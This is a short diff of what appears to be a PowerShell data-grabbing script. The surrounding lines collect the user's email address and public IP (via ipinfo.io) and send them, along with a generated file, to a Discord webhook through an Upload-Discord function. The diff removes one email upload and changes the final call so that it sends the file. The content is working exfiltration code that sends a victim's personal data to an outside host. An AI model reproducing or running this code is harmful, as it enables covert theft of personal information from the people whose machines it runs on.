@@ -45,8 +45,6 @@ function Get-email {
 $email = Get-email
 
 #------------------------------------------------------------------------------------------------------------------------------------
-Upload-Discord -text $email
-#------------------------------------------------------------------------------------------------------------------------------------
 
 
 try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
@@ -111,4 +109,4 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
 #----------------------------------------------------------------------------------------------------------------------------------
 #File Sent
-Upload-Discord -text "Target" -text $output
+Upload-Discord -text "File Upload" -file $FileName
